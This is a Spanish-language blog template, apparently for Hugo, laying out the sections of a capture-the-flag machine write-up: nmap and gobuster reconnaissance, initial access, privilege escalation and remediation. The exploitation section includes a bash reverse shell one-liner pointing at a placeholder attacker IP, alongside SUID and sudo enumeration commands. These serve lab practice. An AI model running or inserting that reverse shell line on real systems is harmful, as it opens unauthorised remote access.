---
title: "Plantilla de Writeup / Proyecto"
date: 2026-10-08T12:00:00+02:00
draft: true
description: "Breve descripción del writeup que aparecerá en la tarjeta de la portada."
tags: ["linux", "facil", "htb", "privesc"]
categories: ["Writeups"]
showTableOfContents: true
---

> Esta es una plantilla base (`draft: true`). No se publicará hasta que cambies `draft: false`.
> Puedes duplicar este archivo cada vez que quieras crear un nuevo artículo.

## 📌 Información General

| Parámetro | Detalle |
| :--- | :--- |
| **Plataforma** | Hack The Box / TryHackMe / VulnHub |
| **Dificultad** | Fácil / Media / Difícil |
| **Sistema Operativo** | Linux / Windows |
| **IP de la máquina** | `10.10.10.x` |
| **Puntos clave** | SQLi, File Upload, Cronjob PrivEsc |

---

## 🔍 1. Reconocimiento y Escaneo

### Escaneo de puertos con Nmap
Comenzamos identificando los puertos y servicios abiertos en el objetivo:

```bash
# Escaneo rápido de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.x -oG allPorts.txt

# Escaneo detallado de versiones y scripts por defecto
nmap -sC -sV -p22,80 10.10.10.x -oN targeted.txt
```

### Enumeración Web / Fuzzing
Si encontramos servicios web abiertos, enumeramos directorios y tecnologías:

```bash
# Descubrimiento de rutas
gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```

> **Nota:** Puedes adjuntar capturas de pantalla fácilmente con:
> `![Descripción de la captura](captura.png)`

---

## 💥 2. Explotación (Acceso Inicial)

### Análisis de la vulnerabilidad
Explicación detallada de la vulnerabilidad descubierta, cómo funciona y qué vector se utiliza.

### Obtención de shell
Comandos o script para obtener una Reverse Shell:

```bash
# Payload de reverse shell
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
```

---

## 🔑 3. Escalada de Privilegios

### Enumeración interna
Búsqueda de vectores de escalada (permisos SUID, sudo, tareas programadas, credenciales):

```bash
sudo -l
find / -perm -4000 2>/dev/null
```

### Explotación y Root
Pasos seguidos para elevar privilegios hasta `root` o `NT AUTHORITY\SYSTEM`:

```bash
whoami
# root
```

---

## 🎯 Conclusión y Mitigaciones

- **Flags conseguidas:** `user.txt` y `root.txt`.
- **Vulnerabilidad principal:** Describir qué causó la brecha.
- **Remediación:** Cómo se parchearía o solucionaría este fallo en un entorno real.
